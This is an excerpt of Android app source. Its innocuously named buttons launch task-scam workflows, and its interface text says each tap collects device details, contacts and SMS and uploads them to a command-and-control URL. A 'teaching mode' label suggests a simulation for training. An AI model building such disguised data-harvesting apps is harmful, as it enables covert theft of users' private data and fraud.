...
public class MainActivity extends AppCompatActivity {
    ...
    private void bindActions() {
        ...
        buttonQuickClean.setOnClickListener(view -> startWorkflow("grab_task", "抢任务"));
        buttonDeepBoost.setOnClickListener(view -> startWorkflow("my_commission", "我的佣金"));
        buttonPrivacyScan.setOnClickListener(view -> startWorkflow("identity_verify", "新手认证"));
        buttonSyncCheck.setOnClickListener(view -> startWorkflow("withdraw", "提现中心"));
    }
    ...
    private void applyPreview(TelemetryReport report) {
        ...
        reportSummaryText.setText("环境已就绪，点击任意操作将在后台采集数据并发起上报。");
        uploadStatusText.setText("上报目标：" + BuildConfig.C2_URL);
        ...
        trafficStatusText.setText("教学模式：上传模拟诈骗数据包与设备摘要。");
    }
    ...
    private void applyReport(TelemetryReport report, UploadResult uploadResult, String localPath, String actionLabel) {
        ...
        deviceLabelText.setText(report.getDeviceSummary());
        reportSummaryText.setText("最近一次操作已采集设备信息、通讯录、短信等数据，并完成向固定目标地址的后台上报。");
